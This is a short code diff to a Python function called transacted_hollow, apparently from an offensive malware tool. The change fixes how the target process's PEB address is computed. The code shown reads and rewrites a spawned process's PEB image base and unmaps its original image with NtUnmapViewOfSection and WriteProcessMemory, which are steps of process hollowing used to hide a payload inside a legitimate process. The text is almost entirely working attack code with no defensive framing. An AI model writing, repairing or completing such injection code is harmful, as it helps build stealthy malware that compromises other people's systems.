@@ -195,7 +195,8 @@ def transacted_hollow(payload):
     # Read original image base
     originalBase=ctypes.c_void_p()
     bytesRead=ctypes.c_size_t()
-    ReadProcessMemory(pi.hProcess,ctypes.c_void_p(pbi.PebBaseAddress.value+PEB_IMAGEBASE_OFFSET),ctypes.byref(originalBase),ctypes.sizeof(ctypes.c_void_p),ctypes.byref(bytesRead))
+    pebAddr=int(pbi.PebBaseAddress)
+    ReadProcessMemory(pi.hProcess,ctypes.c_void_p(pebAddr+PEB_IMAGEBASE_OFFSET),ctypes.byref(originalBase),ctypes.sizeof(ctypes.c_void_p),ctypes.byref(bytesRead))
     
     # Unmap original image
     NtUnmapViewOfSection(pi.hProcess,originalBase)
@@ -213,7 +214,8 @@ def transacted_hollow(payload):
         return False
     
     # Update PEB image base
-    WriteProcessMemory(pi.hProcess,ctypes.c_void_p(pbi.PebBaseAddress.value+PEB_IMAGEBASE_OFFSET),ctypes.byref(remoteBase),ctypes.sizeof(ctypes.c_void_p),None)
+    pebAddr=int(pbi.PebBaseAddress)
+    WriteProcessMemory(pi.hProcess,ctypes.c_void_p(pebAddr+PEB_IMAGEBASE_OFFSET),ctypes.byref(remoteBase),ctypes.sizeof(ctypes.c_void_p),None)
     
     # Get entry point from PE headers
     dosHeader=ctypes.create_string_buffer(64)
